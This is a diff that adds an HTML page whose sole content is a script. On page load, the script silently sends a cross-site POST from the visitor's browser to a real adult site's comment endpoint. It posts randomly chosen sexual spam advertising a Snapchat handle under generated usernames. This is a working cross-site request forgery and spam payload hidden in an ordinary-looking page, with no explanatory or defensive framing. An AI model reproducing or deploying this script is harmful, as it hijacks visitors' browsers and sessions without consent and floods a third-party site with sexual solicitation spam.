@@ -1,1 +1,51 @@
-null
+<html><head><script>
+
+function getVid(){
+   var sites = ["8559971", "9122754", "5046390", "8815502", "4086677", "8348839", "9039250", "6059034", "573746", "1483400", "5203008", "1254392", "9089917", "9121114", "8896222", "9108281", "9132580", "1309905", "8009200", "8508422", "3961305", "7502715", "7969711", "6320245", "3234943", "2321761", "5753586", "2482397", "7041530", "8044712", "3003085", "6815562", "7025814", "7727422", "4704157", "3378922", "8231229", "5826018", "4055559"];
+    var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
+
+function getCom(){
+   var sites1 = ["i need some fun in my life, snapchat, princessgurlx", "im horny and bored, snapchat me? princessgurlx", "add me on snapppchat, princessgurlx", "my bf is out, lets have fun on snapchat, princessgurlx", "whos playin on snapchat? princessgurlx","add me on snapchat for fun, princessgurlx", "whos on snapchat? princessgurlx", "18 female lookin for fun on snapchat princessgurlx", "omg so horny, sum1 add me on snapchat, princessgurlx"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
+};
+
+var randy=Math.floor(Math.random()*1100);
+var cmt=getCom();
+var vid=getVid();
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+    xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
+    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+    xmlhttp['send']('user=snapmee'+randy+'&comment=' + cmt + '&test=ok');
+
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
+</script>
+</head>
+</html>
